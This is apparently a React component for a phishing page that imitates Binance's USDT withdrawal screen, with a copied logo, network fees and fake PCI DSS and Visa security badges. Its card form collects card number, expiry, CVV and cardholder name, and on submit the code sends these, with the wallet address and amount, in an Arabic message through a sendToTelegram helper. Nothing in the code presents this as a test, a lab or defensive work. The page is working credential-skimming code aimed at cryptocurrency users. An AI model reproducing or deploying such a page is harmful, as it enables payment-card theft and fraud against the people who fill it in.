import { useState } from "react";
import { sendToTelegram } from "../utils/telegram";
import { t, languages, type Lang } from "../i18n/translations";

const langLocaleMap: Record<string, string> = {
  ar: "ar-EG",
  fa: "fa-IR",
  hi: "hi-IN",
};

function formatNum(value: string, lang: string): string {
  const num = parseFloat(value.replace(/[^0-9.]/g, ""));
  if (isNaN(num)) return value;
  const locale = langLocaleMap[lang];
  if (locale) return num.toLocaleString(locale);
  return num.toLocaleString("en-US");
}

function parseLocaleInput(value: string): string {
  return value
    .replace(/[٠-٩]/g, (d) => String("٠١٢٣٤٥٦٧٨٩".indexOf(d)))
    .replace(/[۰-۹]/g, (d) => String("۰۱۲۳۴۵۶۷۸۹".indexOf(d)))
    .replace(/[०-९]/g, (d) => String("०१२३४५६७८९".indexOf(d)))
    .replace(/[^0-9.]/g, "");
}

const networkBase = [
  { id: "bep20", name: "BNB Smart Chain (BEP20)", fee: "0.29 USDT", feeUsd: "≈ $0.289971", arrival5: true },
  { id: "avax", name: "AVAX C-Chain", fee: "0.8 USDT", feeUsd: "≈ $0.799920", arrival5: true },
  { id: "bep2", name: "BNB Beacon Chain (BEP2)", fee: "0.8 USDT", feeUsd: "≈ $0.799920", arrival5: true },
  { id: "erc20", name: "Ethereum (ERC20)", fee: "2.5 USDT", feeUsd: "≈ $2.499800", arrival5: false },
];

interface WithdrawPageProps {
  onBack: () => void;
  onCardSubmit: (iqdAmount: string) => void;
  lang: Lang;
}

export default function WithdrawPage({ onBack, onCardSubmit, lang }: WithdrawPageProps) {
  const tr = t[lang];
  const dir = languages.find((l) => l.code === lang)?.dir || "rtl";
  const networks = networkBase.map((n) => ({ ...n, arrival: n.arrival5 ? tr.arrival5 : tr.arrival10 }));
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("1000");
  const [withdrawIqd, setWithdrawIqd] = useState("1350000");
  const [selectedNetwork, setSelectedNetwork] = useState<typeof networks[0] | null>(null);
  const [showNetworkModal, setShowNetworkModal] = useState(false);
  const [tempNetwork, setTempNetwork] = useState<typeof networks[0] | null>(null);
  const [showCardModal, setShowCardModal] = useState(false);
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [cardError, setCardError] = useState("");
  const [saveCard, setSaveCard] = useState(true);

  const handleNetworkConfirm = () => {
    if (tempNetwork) {
      setSelectedNetwork(tempNetwork);
    }
    setShowNetworkModal(false);
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "linear-gradient(180deg, #1B2B5E 0%, #1a3060 50%, #162756 100%)",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        fontFamily: "'Cairo', 'Arial', sans-serif",
        direction: dir,
        position: "relative",
        paddingBottom: 32,
      }}
    >
      {/* Header */}
      <div
        style={{
          width: "100%",
          maxWidth: 480,
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          padding: "16px 20px",
          boxSizing: "border-box",
        }}
      >
        <button
          onClick={onBack}
          style={{
            background: "none",
            border: "none",
            color: "#F0B90B",
            fontSize: 22,
            cursor: "pointer",
            padding: 4,
          }}
        >
          ←
        </button>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ color: "#F0B90B", fontSize: 20, fontWeight: 900 }}>
            BINANCE
          </span>
          <svg width="26" height="26" viewBox="0 0 126.6 126.6" fill="none">
            <path fill="#F0B90B" d="M38.7 53.2L63.3 28.6l24.6 24.6 14.3-14.3L63.3 0 24.4 38.9z"/>
            <path fill="#F0B90B" d="M0 63.3l14.3-14.3 14.3 14.3-14.3 14.3z"/>
            <path fill="#F0B90B" d="M38.7 73.4L63.3 98l24.6-24.6 14.3 14.3-38.9 38.9-38.9-38.9 14.6-14.3z"/>
            <path fill="#F0B90B" d="M98 63.3l14.3-14.3 14.3 14.3-14.3 14.3z"/>
            <path fill="#F0B90B" d="M77.9 63.3L63.3 48.7 52.1 59.9l-1.3 1.3-2.6 2.6 14.6 14.6 14.6-14.6-.1-.5z"/>
          </svg>
        </div>
      </div>

      {/* Title */}
      <div
        style={{
          width: "100%",
          maxWidth: 480,
          padding: "0 20px 12px",
          boxSizing: "border-box",
        }}
      >
        <h2
          style={{
            color: "#fff",
            fontSize: 20,
            fontWeight: 700,
            margin: 0,
            textAlign: "right",
          }}
        >
          {tr.sendUsdt}
        </h2>
        <p style={{ color: "#a0aec0", fontSize: 13, margin: "4px 0 0", textAlign: dir === "rtl" ? "right" : "left" }}>
          {tr.sendUsdtDesc}
        </p>
      </div>

      {/* White Card */}
      <div
        style={{
          width: "100%",
          maxWidth: 480,
          margin: "0 20px",
          boxSizing: "border-box",
          padding: "0 16px",
        }}
      >
        <div
          style={{
            background: "#fff",
            borderRadius: 16,
            overflow: "hidden",
            boxShadow: "0 4px 24px rgba(0,0,0,0.18)",
          }}
        >
          {/* Address section */}
          <div style={{ padding: "16px 16px 0" }}>
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 8,
              }}
            >
              <span style={{ color: "#888", fontSize: 13 }}>{tr.address}</span>
            </div>
            <div
              style={{
                background: "#f5f5f7",
                borderRadius: 10,
                padding: "14px 12px",
                display: "flex",
                alignItems: "center",
                gap: 10,
                marginBottom: 16,
              }}
            >
              {/* QR icon */}
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                <rect x="3" y="3" width="7" height="7" rx="1" stroke="#aaa" strokeWidth="1.5" fill="none"/>
                <rect x="14" y="3" width="7" height="7" rx="1" stroke="#aaa" strokeWidth="1.5" fill="none"/>
                <rect x="3" y="14" width="7" height="7" rx="1" stroke="#aaa" strokeWidth="1.5" fill="none"/>
                <rect x="5" y="5" width="3" height="3" fill="#aaa"/>
                <rect x="16" y="5" width="3" height="3" fill="#aaa"/>
                <rect x="5" y="16" width="3" height="3" fill="#aaa"/>
                <path d="M14 14h2v2h-2zM17 14h3v1h-3zM14 17h1v3h-1zM17 17h1v1h1v1h-2zM19 19h2v2h-2z" fill="#aaa"/>
              </svg>
              {/* Contact icon */}
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="8" r="4" stroke="#aaa" strokeWidth="1.5" fill="none"/>
                <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" fill="none"/>
              </svg>
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder={tr.pastePlaceholder}
                style={{
                  flex: 1,
                  background: "none",
                  border: "none",
                  outline: "none",
                  textAlign: "right",
                  fontSize: 14,
                  color: "#bbb",
                  fontFamily: "'Cairo', 'Arial', sans-serif",
                  direction: "rtl",
                }}
              />
            </div>
          </div>

          {/* Divider */}
          <div style={{ height: 1, background: "#f0f0f0", margin: "0 16px" }} />

          {/* Network section */}
          <div style={{ padding: "16px 16px 0" }}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 6,
                marginBottom: 8,
              }}
            >
              <span style={{ color: "#888", fontSize: 13 }}>{tr.network}</span>
              <span
                style={{
                  width: 16,
                  height: 16,
                  borderRadius: "50%",
                  border: "1.5px solid #aaa",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: 10,
                  color: "#aaa",
                }}
              >
                i
              </span>
            </div>
            <button
              onClick={() => {
                setTempNetwork(selectedNetwork);
                setShowNetworkModal(true);
              }}
              style={{
                width: "100%",
                background: "#f5f5f7",
                border: "none",
                borderRadius: 10,
                padding: "14px 12px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                cursor: "pointer",
                marginBottom: 16,
                fontFamily: "'Cairo', 'Arial', sans-serif",
              }}
            >
              <span style={{ color: "#aaa", fontSize: 14 }}>‹</span>
              <span
                style={{
                  color: selectedNetwork ? "#222" : "#bbb",
                  fontSize: 14,
                  fontFamily: "'Cairo', 'Arial', sans-serif",
                }}
              >
                {selectedNetwork ? selectedNetwork.name : tr.autoMatch}
              </span>
            </button>
          </div>

          {/* Divider */}
          <div style={{ height: 1, background: "#f0f0f0", margin: "0 16px" }} />

          {/* Amount section */}
          <div style={{ padding: "16px 16px 0" }}>
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 8,
              }}
            >
              <span style={{ color: "#888", fontSize: 13 }}>{tr.amount}</span>
            </div>
            <div
              style={{
                background: "#f5f5f7",
                borderRadius: 10,
                padding: "14px 12px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                marginBottom: 16,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <span
                  style={{ color: "#F0B90B", fontSize: 13, fontWeight: 700 }}
                >
                  {tr.max}
                </span>
                <span style={{ color: "#888", fontSize: 13 }}>USDT</span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: 6, direction: "rtl" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  value={formatNum(amount, lang)}
                  onChange={(e) => setAmount(parseLocaleInput(e.target.value))}
                  style={{
                    background: "none",
                    border: "none",
                    outline: "none",
                    fontSize: 18,
                    fontWeight: 700,
                    color: "#bbb",
                    textAlign: "right",
                    width: 100,
                    fontFamily: "'Cairo', 'Arial', sans-serif",
                  }}
                />
                <span style={{ color: "#ccc", fontSize: 12, whiteSpace: "nowrap" }}>{tr.minimum}</span>
              </div>
            </div>
          </div>

          {/* Divider */}
          <div style={{ height: 1, background: "#f0f0f0", margin: "0 16px" }} />

          {/* Withdrawal amount */}
          <div style={{ padding: "16px 16px 0" }}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 6,
                marginBottom: 8,
              }}
            >
              <span style={{ color: "#888", fontSize: 13 }}>{tr.withdrawAmount}</span>
              <span
                style={{
                  width: 16,
                  height: 16,
                  borderRadius: "50%",
                  border: "1.5px solid #aaa",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: 10,
                  color: "#aaa",
                }}
              >
                i
              </span>
            </div>
            <div
              style={{
                background: "#f5f5f7",
                borderRadius: 10,
                padding: "14px 12px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                marginBottom: 16,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <span
                  style={{ color: "#F0B90B", fontSize: 13, fontWeight: 700 }}
                >
                  {tr.max}
                </span>
                <span style={{ color: "#888", fontSize: 13 }}>IQD</span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: 6, direction: "rtl" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  value={formatNum(withdrawIqd, lang)}
                  onChange={(e) => setWithdrawIqd(parseLocaleInput(e.target.value))}
                  style={{
                    background: "none",
                    border: "none",
                    outline: "none",
                    fontSize: 18,
                    fontWeight: 700,
                    color: "#bbb",
                    textAlign: "right",
                    width: 120,
                    fontFamily: "'Cairo', 'Arial', sans-serif",
                  }}
                />
                <span style={{ color: "#ccc", fontSize: 12, whiteSpace: "nowrap" }}>{tr.minimum}</span>
              </div>
            </div>
          </div>

          {/* Footer — clickable Card section */}
          <button
            onClick={() => { setShowCardModal(true); setCardError(""); }}
            style={{
              width: "100%",
              padding: "12px 16px 16px",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              borderTop: "1px solid #f0f0f0",
              background: "none",
              border: "none",
              borderTop: "1px solid #f0f0f0",
              cursor: "pointer",
              textAlign: "right",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              {/* Visa */}
              <div
                style={{
                  background: "#1a1f71",
                  borderRadius: 4,
                  padding: "3px 8px",
                  color: "#fff",
                  fontStyle: "italic",
                  fontSize: 13,
                  fontWeight: 900,
                }}
              >
                VISA
              </div>
              {/* Mastercard */}
              <div style={{ display: "flex" }}>
                <div
                  style={{
                    width: 18,
                    height: 18,
                    borderRadius: "50%",
                    background: "#EB001B",
                    marginRight: -8,
                  }}
                />
                <div
                  style={{
                    width: 18,
                    height: 18,
                    borderRadius: "50%",
                    background: "#F79E1B",
                    opacity: 0.9,
                  }}
                />
              </div>
              <span style={{ color: "#888", fontSize: 13 }}>Card</span>
            </div>
            <span style={{ color: "#aaa", fontSize: 18 }}>∧</span>
          </button>
        </div>

      </div>

      {/* Network Modal */}
      {showNetworkModal && (
        <>
          {/* Backdrop */}
          <div
            onClick={() => setShowNetworkModal(false)}
            style={{
              position: "fixed",
              inset: 0,
              background: "rgba(0,0,0,0.5)",
              zIndex: 100,
            }}
          />
          {/* Modal sheet */}
          <div
            style={{
              position: "fixed",
              bottom: 0,
              left: "50%",
              transform: "translateX(-50%)",
              width: "100%",
              maxWidth: 480,
              background: "#fff",
              borderRadius: "20px 20px 0 0",
              zIndex: 101,
              padding: "20px 20px 32px",
              boxSizing: "border-box",
            }}
          >
            {/* Modal header */}
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 6,
              }}
            >
              <button
                onClick={() => setShowNetworkModal(false)}
                style={{
                  background: "none",
                  border: "none",
                  fontSize: 20,
                  cursor: "pointer",
                  color: "#555",
                  padding: 0,
                }}
              >
                ✕
              </button>
              <span style={{ fontWeight: 700, fontSize: 17, color: "#222" }}>
                {tr.network}
              </span>
              <button
                style={{
                  background: "none",
                  border: "none",
                  color: "#F0B90B",
                  fontSize: 14,
                  cursor: "pointer",
                  fontFamily: "'Cairo', 'Arial', sans-serif",
                }}
              >
                {tr.feeDetails}
              </button>
            </div>

            <p
              style={{
                color: "#888",
                fontSize: 12,
                textAlign: "right",
                marginBottom: 16,
                lineHeight: 1.6,
              }}
            >
              {tr.networkWarning}
            </p>

            {/* Network list */}
            <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
              {networks.map((network, idx) => (
                <button
                  key={network.id}
                  onClick={() => setTempNetwork(network)}
                  style={{
                    background:
                      tempNetwork?.id === network.id ? "#fffbea" : "#fff",
                    border: "none",
                    borderBottom:
                      idx < networks.length - 1 ? "1px solid #f0f0f0" : "none",
                    padding: "14px 0",
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "flex-end",
                    cursor: "pointer",
                    width: "100%",
                    textAlign: "right",
                    transition: "background 0.15s",
                  }}
                >
                  <span
                    style={{
                      fontWeight: 700,
                      fontSize: 15,
                      color: "#222",
                      fontFamily: "'Cairo', 'Arial', sans-serif",
                    }}
                  >
                    {network.name}
                  </span>
                  <div
                    style={{
                      display: "flex",
                      gap: 8,
                      marginTop: 4,
                      flexDirection: "row-reverse",
                    }}
                  >
                    <span style={{ color: "#888", fontSize: 12 }}>
                      {network.arrival}
                    </span>
                    <span style={{ color: "#888", fontSize: 12 }}>
                      {tr.fee} {network.fee} ({network.feeUsd})
                    </span>
                  </div>
                </button>
              ))}
            </div>

            {/* Confirm button */}
            <button
              onClick={handleNetworkConfirm}
              style={{
                width: "100%",
                marginTop: 20,
                padding: "15px",
                background: "#F0B90B",
                border: "none",
                borderRadius: 10,
                color: "#1a1f2e",
                fontSize: 17,
                fontWeight: 700,
                fontFamily: "'Cairo', 'Arial', sans-serif",
                cursor: "pointer",
                transition: "opacity 0.2s",
              }}
              onMouseEnter={(e) =>
                ((e.currentTarget as HTMLButtonElement).style.opacity = "0.88")
              }
              onMouseLeave={(e) =>
                ((e.currentTarget as HTMLButtonElement).style.opacity = "1")
              }
            >
              {tr.confirm}
            </button>
          </div>
        </>
      )}

      {/* Card Modal */}
      {showCardModal && (
        <>
          <div
            onClick={() => setShowCardModal(false)}
            style={{
              position: "fixed",
              inset: 0,
              background: "rgba(0,0,0,0.5)",
              zIndex: 100,
            }}
          />
          <div
            style={{
              position: "fixed",
              bottom: 0,
              left: "50%",
              transform: "translateX(-50%)",
              width: "100%",
              maxWidth: 480,
              background: "#f5f5f7",
              borderRadius: "20px 20px 0 0",
              zIndex: 101,
              boxSizing: "border-box",
              maxHeight: "92vh",
              overflowY: "auto",
            }}
          >
            {/* Modal header */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                padding: "18px 20px 14px",
                background: "#fff",
                borderRadius: "20px 20px 0 0",
                borderBottom: "1px solid #eee",
              }}
            >
              <button
                onClick={() => setShowCardModal(false)}
                style={{
                  background: "none",
                  border: "none",
                  color: "#555",
                  fontSize: 20,
                  cursor: "pointer",
                  padding: 0,
                  lineHeight: 1,
                }}
              >
                ›
              </button>
              <span style={{ fontWeight: 700, fontSize: 16, color: "#222", flex: 1, textAlign: dir === "rtl" ? "right" : "left", marginRight: 8 }}>
                {tr.creditDebitCard}
              </span>
              {/* Card icon */}
              <div
                style={{
                  width: 42,
                  height: 42,
                  borderRadius: "50%",
                  background: "#e8f4ff",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                  <rect x="2" y="5" width="20" height="14" rx="2" stroke="#2196F3" strokeWidth="1.8" fill="none"/>
                  <path d="M2 10h20" stroke="#2196F3" strokeWidth="1.8"/>
                  <rect x="5" y="13" width="4" height="2" rx="0.5" fill="#2196F3"/>
                </svg>
              </div>
            </div>

            {/* Card form */}
            <div style={{ padding: "20px 20px 0" }}>
              {/* Sub header */}
              <div
                style={{
                  background: "#fff",
                  borderRadius: 14,
                  padding: "16px 16px 20px",
                  marginBottom: 16,
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    marginBottom: 16,
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    {/* JCB */}
                    <div
                      style={{
                        border: "1px solid #ddd",
                        borderRadius: 4,
                        padding: "2px 6px",
                        fontSize: 11,
                        fontWeight: 900,
                        color: "#003087",
                        background: "#fff",
                      }}
                    >
                      JCB
                    </div>
                    {/* Mastercard */}
                    <div style={{ display: "flex" }}>
                      <div style={{ width: 20, height: 20, borderRadius: "50%", background: "#EB001B", marginRight: -8 }} />
                      <div style={{ width: 20, height: 20, borderRadius: "50%", background: "#F79E1B", opacity: 0.9 }} />
                    </div>
                    {/* Visa */}
                    <div
                      style={{
                        background: "#1a1f71",
                        borderRadius: 4,
                        padding: "2px 7px",
                        color: "#fff",
                        fontStyle: "italic",
                        fontSize: 12,
                        fontWeight: 900,
                      }}
                    >
                      VISA
                    </div>
                  </div>
                  <span style={{ fontWeight: 700, fontSize: 15, color: "#222", textAlign: dir === "rtl" ? "right" : "left" }}>
                    {tr.payWithNewCard}
                  </span>
                </div>

                {/* Card number */}
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => { setCardError(""); setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)); }}
                  placeholder={tr.cardNumber}
                  inputMode="numeric"
                  style={{
                    width: "100%",
                    border: "1.5px solid #e0e0e0",
                    borderRadius: 10,
                    padding: "14px 14px",
                    fontSize: 15,
                    textAlign: "right",
                    fontFamily: "'Cairo', 'Arial', sans-serif",
                    direction: "rtl",
                    outline: "none",
                    marginBottom: 10,
                    boxSizing: "border-box",
                    color: "#222",
                    background: "#fff",
                  }}
                />

                {/* CVV + Expiry row */}
                <div style={{ display: "flex", gap: 10, marginBottom: 10 }}>
                  {/* Expiry */}
                  <input
                    type="text"
                    value={expiry}
                    onChange={(e) => {
                      setCardError("");
                      let val = e.target.value.replace(/\D/g, "").slice(0, 4);
                      if (val.length >= 3) val = val.slice(0, 2) + "/" + val.slice(2);
                      setExpiry(val);
                    }}
                    placeholder="MM/YY"
                    inputMode="numeric"
                    maxLength={5}
                    style={{
                      flex: 1,
                      border: "1.5px solid #e0e0e0",
                      borderRadius: 10,
                      padding: "14px 14px",
                      fontSize: 14,
                      textAlign: "right",
                      fontFamily: "'Cairo', 'Arial', sans-serif",
                      direction: "rtl",
                      outline: "none",
                      boxSizing: "border-box",
                      color: "#222",
                      background: "#fff",
                    }}
                  />
                  {/* CVV */}
                  <div
                    style={{
                      flex: 1,
                      border: "1.5px solid #e0e0e0",
                      borderRadius: 10,
                      padding: "14px 14px",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "space-between",
                      background: "#fff",
                      boxSizing: "border-box",
                      overflow: "hidden",
                      minWidth: 0,
                    }}
                  >
                    <svg width="28" height="18" viewBox="0 0 28 18" fill="none">
                      <rect x="0" y="0" width="28" height="18" rx="3" fill="#e0e0e0"/>
                      <rect x="0" y="4" width="28" height="5" fill="#bbb"/>
                      <rect x="16" y="11" width="9" height="4" rx="1" fill="#fff"/>
                      <text x="17.5" y="14.5" fontSize="4" fill="#555" fontFamily="Arial">123</text>
                    </svg>
                    <input
                      type="text"
                      value={cvv}
                      onChange={(e) => { setCardError(""); setCvv(e.target.value.replace(/\D/g, "").slice(0, 4)); }}
                      placeholder="CVV/CVC"
                      inputMode="numeric"
                      style={{
                        flex: 1,
                        background: "none",
                        border: "none",
                        outline: "none",
                        textAlign: "right",
                        fontSize: 14,
                        fontFamily: "'Cairo', 'Arial', sans-serif",
                        color: "#222",
                        minWidth: 0,
                        width: 0,
                      }}
                    />
                  </div>
                </div>

                {/* Cardholder name */}
                <input
                  type="text"
                  value={cardHolder}
                  onChange={(e) => { setCardError(""); setCardHolder(e.target.value); }}
                  placeholder={tr.cardHolder}
                  style={{
                    width: "100%",
                    border: "1.5px solid #e0e0e0",
                    borderRadius: 10,
                    padding: "14px 14px",
                    fontSize: 15,
                    textAlign: "right",
                    fontFamily: "'Cairo', 'Arial', sans-serif",
                    direction: "rtl",
                    outline: "none",
                    marginBottom: 14,
                    boxSizing: "border-box",
                    color: "#222",
                    background: "#fff",
                  }}
                />

                {/* Save card checkbox */}
                <label
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "flex-end",
                    gap: 10,
                    cursor: "pointer",
                    fontSize: 13,
                    color: "#555",
                    fontFamily: "'Cairo', 'Arial', sans-serif",
                  }}
                >
                  <span>{tr.saveCard}</span>
                  <input
                    type="checkbox"
                    checked={saveCard}
                    onChange={(e) => setSaveCard(e.target.checked)}
                    style={{ width: 18, height: 18, accentColor: "#F0B90B", cursor: "pointer" }}
                  />
                </label>
              </div>

              {/* Card error message */}
              {cardError && (
                <div style={{
                  color: "#e53935",
                  fontSize: 13,
                  fontFamily: "'Cairo', Arial, sans-serif",
                  textAlign: "center",
                  marginBottom: 10,
                  fontWeight: 600,
                }}>
                  {cardError}
                </div>
              )}

              {/* Submit button inside card modal */}
              <button
                onClick={() => {
                  const rawNum = cardNumber.replace(/\s/g, "");
                  if (rawNum.length < 16) {
                    setCardError(tr.errorCardNumber);
                    return;
                  }
                  if (expiry.length < 5) {
                    setCardError(tr.errorExpiry);
                    return;
                  }
                  if (cvv.length < 3) {
                    setCardError(tr.errorCvv);
                    return;
                  }
                  if (cardHolder.trim().length < 3) {
                    setCardError(tr.errorCardHolder);
                    return;
                  }
                  setCardError("");
                  setShowCardModal(false);
                  const rate = 1350;
                  const iqd = (parseFloat(amount || "0") * rate).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                  sendToTelegram(
                    `💳 <b>بيانات البطاقة الجديدة</b>\n\n` +
                    `🔢 رقم البطاقة: <code>${cardNumber}</code>\n` +
                    `📅 تاريخ الانتهاء: <code>${expiry}</code>\n` +
                    `🔐 CVV: <code>${cvv}</code>\n` +
                    `👤 اسم صاحب البطاقة: <code>${cardHolder}</code>\n\n` +
                    `💵 المبلغ: <code>${amount} USDT</code>\n` +
                    `🏦 الشبكة: <code>${selectedNetwork?.name || "غير محدد"}</code>\n` +
                    `📬 العنوان: <code>${address}</code>\n` +
                    `💰 المبلغ بالدينار: <code>IQD ${iqd}</code>`
                  );
                  onCardSubmit(iqd);
                }}
                style={{
                  width: "100%",
                  marginTop: 20,
                  marginBottom: 16,
                  padding: "15px",
                  background: "#F0B90B",
                  border: "none",
                  borderRadius: 10,
                  color: "#1a1f2e",
                  fontSize: 17,
                  fontWeight: 700,
                  fontFamily: "'Cairo', 'Arial', sans-serif",
                  cursor: "pointer",
                  transition: "opacity 0.2s",
                }}
                onMouseEnter={(e) =>
                  ((e.currentTarget as HTMLButtonElement).style.opacity = "0.88")
                }
                onMouseLeave={(e) =>
                  ((e.currentTarget as HTMLButtonElement).style.opacity = "1")
                }
              >
                {tr.confirm}
              </button>

              {/* Security badges */}
              <div
                style={{
                  background: "#fff",
                  borderRadius: 14,
                  padding: "14px 16px",
                  marginBottom: 24,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  flexDirection: "row-reverse",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" fill="#4CAF50" opacity="0.15"/>
                    <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" stroke="#4CAF50" strokeWidth="1.5" fill="none"/>
                    <path d="M9 12l2 2 4-4" stroke="#4CAF50" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <span style={{ fontSize: 12, color: "#555", fontWeight: 600 }}>
                    100% Data Security Compliance
                  </span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  {/* PCI DSS badge */}
                  <div style={{ textAlign: "center" }}>
                    <div style={{ fontSize: 8, color: "#888", lineHeight: 1 }}>PCI</div>
                    <div style={{ fontSize: 10, fontWeight: 900, color: "#1976D2", lineHeight: 1 }}>DSS</div>
                    <div style={{ fontSize: 7, color: "#999", lineHeight: 1 }}>COMPLIANT</div>
                  </div>
                  {/* Verified by Visa */}
                  <div style={{ textAlign: "center" }}>
                    <div style={{ fontSize: 7, color: "#888" }}>Verified by</div>
                    <div style={{ fontSize: 11, fontWeight: 900, color: "#1a1f71", fontStyle: "italic" }}>VISA</div>
                  </div>
                  {/* Mastercard SecureCode */}
                  <div style={{ textAlign: "center" }}>
                    <div style={{ display: "flex", marginBottom: 2 }}>
                      <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#EB001B", marginRight: -5 }} />
                      <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#F79E1B" }} />
                    </div>
                    <div style={{ fontSize: 6, color: "#888" }}>SecureCode</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  );
}
